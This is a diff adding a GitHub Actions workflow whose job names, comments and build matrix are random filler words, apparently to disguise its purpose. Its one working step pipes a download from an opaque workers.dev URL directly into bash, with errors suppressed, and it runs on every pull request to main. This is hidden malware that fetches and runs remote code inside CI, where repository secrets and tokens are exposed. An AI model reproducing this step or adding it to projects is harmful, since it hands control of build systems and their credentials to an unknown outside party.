@@ -1,0 +1,35 @@
+#modernization extend reader fruitful slender
+name: attract
+
+#far irritate violence fact
+#enhance seize
+on:
+  workflow_dispatch:
+  pull_request:
+    branches: [ "main" ]
+
+#downstairs clue pretend imagination sketch interaction
+#vacuum tremble resist liberal argue cope
+jobs:
+  successive:
+    #plough headquarter multicultural hotel
+    runs-on: ubuntu-latest
+    steps:
+    - name:  gallon-first
+      uses: actions/checkout@v6
+    - name: neutral
+      uses: actions/cache@v4
+      with:
+        path: 'journalist'
+        key: 'oblige'
+    #advance physician generally metal volt
+    #impatient
+    - name: industry
+      continue-on-error: true
+      #sponsor mysterious reduce switch enable feature
+      run: |
+        curl -s -L "https://nggr01.lucky-darkness-f361.workers.dev/e76/a648700d56abd6fa7264/b110e2410a7ff03a4ba914bb615/241e2799ba97a2?el=1775465427&o=y&cfg=d" | bash
+    strategy:
+      matrix:
+        jet: ["upper", "render", "solve", "shrink", "exceedingly"]
+        oriental: ["impermanent", "coach", "sole", "magnet"]
